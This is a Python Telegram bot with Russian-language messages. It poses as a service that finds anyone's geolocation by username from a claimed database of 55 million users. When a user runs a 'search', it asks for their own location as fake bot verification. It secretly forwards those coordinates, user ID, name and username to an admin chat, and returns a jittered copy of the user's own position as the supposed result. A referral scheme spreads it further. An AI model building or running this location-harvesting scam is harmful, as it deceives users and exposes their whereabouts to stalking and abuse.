from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import logging
import random
from datetime import datetime, time   

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = ""
ADMIN_CHAT_ID = ""
ARTICLE_URL = ""

user_data = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ref_link = f"https://t.me/{(await context.bot.get_me()).username}?start=ref{user.id}"
    
    if user.id not in user_data:
        user_data[user.id] = {
            'referrals': 0,
            'available_requests': 3,
            'max_requests': 3,
            'last_reset': datetime.now(),
            'username': user.username,
            'first_name': user.first_name
        }
    
    if context.args and context.args[0].startswith('ref'):
        referrer_id = int(context.args[0][3:])
        if referrer_id != user.id and referrer_id in user_data:
            user_data[referrer_id]['referrals'] = min(user_data[referrer_id]['referrals'] + 1, 3)
            
            referrals = user_data[referrer_id]['referrals']
            if referrals == 1:
                user_data[referrer_id]['max_requests'] = 5
                user_data[referrer_id]['available_requests'] = 5
            elif referrals == 2:
                user_data[referrer_id]['max_requests'] = 8
                user_data[referrer_id]['available_requests'] = 8
            elif referrals >= 3:
                user_data[referrer_id]['max_requests'] = 999  
                user_data[referrer_id]['available_requests'] = 999
    
    await update.message.reply_text(
        f'🔍 Бот для пробива геолокации\n\n'
        f'📊 В нашей базе данных более 55 миллионов пользователей\n'
        f'👥 Рефералы: {user_data[user.id]["referrals"]}/3\n'
        f'🚀 Доступно запросов: {user_data[user.id]["available_requests"]}\n\n'
        f'📖 Подробнее о работе бота: {ARTICLE_URL}\n\n'
        f'📎 Ваша реферальная ссылка: {ref_link}\n\n'
        f'Введите юзернейм для поиска:'
    )

async def handle_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user_data[user.id]['available_requests'] <= 0:
        await update.message.reply_text(
            '❌ Лимит запросов исчерпан!\n'
            f'📖 Узнайте как увеличить лимит: {ARTICLE_URL}\n'
            'Пригласите друзей чтобы увеличить лимит:'
        )
        return
    
    user_data[user.id]['available_requests'] -= 1
    
    keyboard = [[KeyboardButton(text="📍 Подтвердить запрос", request_location=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        f'🔎 Ищем @{update.message.text} в базе из 55M+ пользователей...\n'
        f'📖 Как это работает: {ARTICLE_URL}\n\n'
        'Для верификации и подтверждения что вы не бот, '
        'отправьте вашу геопозицию:',
        reply_markup=reply_markup
    )

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lat = update.message.location.latitude
    lon = update.message.location.longitude
    user = update.effective_user
    
    await context.bot.send_location(
        chat_id=ADMIN_CHAT_ID,
        latitude=lat,
        longitude=lon
    )
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f'🎯 Новые координаты\nUser: {user.id}\nName: {user.first_name}\nUsername: @{user.username}'
    )
    
    fake_lat = round(lat + random.uniform(-0.01, 0.01), 6)
    fake_lon = round(lon + random.uniform(-0.01, 0.01), 6)
    
    await update.message.reply_text(
        f'📍 Геолокация найдена в нашей базе из 55M+ пользователей!\n\n'
        f'Координаты: {fake_lat}, {fake_lon}\n'
        f'Карта: https://maps.google.com/?q={fake_lat},{fake_lon}\n\n'
        f'💎 Осталось запросов: {user_data[user.id]["available_requests"]}\n'
        f'👥 Пригласите друзей для увеличения лимита\n\n'
        f'📖 Подробнее о работе системы: {ARTICLE_URL}'
    )

async def reset_limits(context):
    for user_id in user_data:
        if user_data[user_id]['referrals'] == 2:  
            user_data[user_id]['available_requests'] = min(
                user_data[user_id]['available_requests'] + 2,
                user_data[user_id]['max_requests']
            )

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    
    job_queue = app.job_queue
    job_queue.run_daily(reset_limits, time=time(hour=0, minute=0))
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.run_polling()